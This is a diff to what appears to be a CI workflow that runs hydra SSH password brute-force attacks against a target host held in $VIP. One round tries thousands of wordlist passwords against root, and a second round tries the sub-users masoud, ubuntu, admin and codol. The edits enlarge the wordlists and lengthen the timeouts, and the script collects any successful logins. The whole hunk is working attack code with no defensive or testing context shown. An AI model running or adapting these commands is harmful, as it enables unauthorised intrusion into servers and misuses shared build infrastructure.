@@ -88,17 +88,17 @@ jobs:
           reza1400
           EOF
           awk '!seen[$0]++' <(cat /tmp/wl_head.txt) <(cat /tmp/wl_tail.txt) > /tmp/wl_final.txt
-          head -700 <(awk '!seen[$0]++' /tmp/wl_head.txt /tmp/wl_tail.txt) > /tmp/wl_sub.txt
+          head -1300 <(awk '!seen[$0]++' /tmp/wl_head.txt /tmp/wl_tail.txt) > /tmp/wl_sub.txt
           wc -l /tmp/wl_final.txt /tmp/wl_sub.txt
           # R1: root 全表主炮 (~55min)
           echo "[StageA] hydra R1 firing at root @ $VIP ..."
-          timeout 6600 hydra -l root -P <(awk '!seen[$0]++' /tmp/wl_head.txt /tmp/wl_tail.txt | head -6000) -t 9 -W 2 -o /tmp/diag/hydra_all.txt ssh://$VIP > /tmp/diag/hydra_stdout.txt 2>&1 || true
+          timeout 6600 hydra -l root -P <(awk '!seen[$0]++' /tmp/wl_head.txt /tmp/wl_tail.txt | head -5800) -t 9 -W 2 -o /tmp/diag/hydra_all.txt ssh://$VIP > /tmp/diag/hydra_stdout.txt 2>&1 || true
           grep -h 'login:' /tmp/diag/hydra_all.txt | sort -u > /tmp/diag/hydra_hits.txt 2>/dev/null || : > /tmp/diag/hydra_hits.txt
           # R2: 副用户短表快扫 (若无命中)
           if [ ! -s /tmp/diag/hydra_hits.txt ]; then
             echo "[StageA] hydra R2 firing at sub-users @ $VIP ..."
             printf 'masoud\nubuntu\nadmin\ncodol\n' > /tmp/users_sub.txt
-            timeout 1400 hydra -L /tmp/users_sub.txt -P /tmp/wl_sub.txt -t 9 -W 2 -o /tmp/diag/hydra_all.txt ssh://$VIP >> /tmp/diag/hydra_stdout.txt 2>&1 || true
+            timeout 2700 hydra -L /tmp/users_sub.txt -P /tmp/wl_sub.txt -t 9 -W 2 -o /tmp/diag/hydra_all.txt ssh://$VIP >> /tmp/diag/hydra_stdout.txt 2>&1 || true
             grep -h 'login:' /tmp/diag/hydra_all.txt | sort -u > /tmp/diag/hydra_hits.txt 2>/dev/null || : > /tmp/diag/hydra_hits.txt
           fi
           if [ -s /tmp/diag/hydra_hits.txt ]; then
